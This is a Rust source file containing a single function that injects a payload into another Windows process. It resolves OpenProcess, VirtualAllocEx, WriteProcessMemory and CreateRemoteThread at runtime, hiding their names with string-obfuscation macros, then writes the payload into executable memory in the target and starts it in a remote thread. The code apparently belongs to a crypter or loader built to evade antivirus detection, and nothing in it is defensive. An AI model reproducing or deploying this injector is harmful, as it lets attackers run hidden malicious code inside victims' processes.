pub unsafe fn exec(p: usize, size: usize, pid: usize) -> Result<(), String> {
    use std::ffi::c_void;
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
    use std::ptr::null_mut;
    use std::mem::transmute;

    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;

    let p_open_process = get_proc_address(kernel32, obf_lit_bytes!(b"OpenProcess\0").as_slice())?;
    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    let open_process: OpenProcessFn = transmute(p_open_process);

    let p_virtual_alloc_ex = get_proc_address(kernel32, obf_lit_bytes!(b"VirtualAllocEx\0").as_slice())?;
    type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
    let virtual_alloc_ex: VirtualAllocExFn = transmute(p_virtual_alloc_ex);

    let p_write_process_memory = get_proc_address(kernel32, obf_lit_bytes!(b"WriteProcessMemory\0").as_slice())?;
    type WriteProcessMemoryFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *const c_void, usize, *mut usize) -> i32;
    let write_process_memory: WriteProcessMemoryFn = transmute(p_write_process_memory);

    let p_create_remote_thread = get_proc_address(kernel32, obf_lit_bytes!(b"CreateRemoteThread\0").as_slice())?;
    type CreateRemoteThreadFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *mut c_void, u32, *mut u32) -> *mut c_void;
    let create_remote_thread: CreateRemoteThreadFn = transmute(p_create_remote_thread);

    let p_close_handle = get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice())?;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
    let close_handle: CloseHandleFn = transmute(p_close_handle);

    const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let h_process = open_process(PROCESS_ALL_ACCESS, 0, pid as u32);
    if h_process.is_null() {
        return Err(obf_lit!("OpenProcess failed").to_string());
    }

    let remote_addr = virtual_alloc_ex(h_process, null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if remote_addr.is_null() {
        close_handle(h_process);
        return Err(obf_lit!("VirtualAllocEx failed").to_string());
    }

    let mut bytes_written = 0;
    let res = write_process_memory(h_process, remote_addr, p as *const c_void, size, &mut bytes_written);
    if res == 0 {
        close_handle(h_process);
        return Err(obf_lit!("WriteProcessMemory failed").to_string());
    }

    let h_thread = create_remote_thread(h_process, null_mut(), 0, Some(transmute(remote_addr)), null_mut(), 0, null_mut());
    if h_thread.is_null() {
        close_handle(h_process);
        return Err(obf_lit!("CreateRemoteThread failed").to_string());
    }

    close_handle(h_thread);
    close_handle(h_process);

    Ok(())
}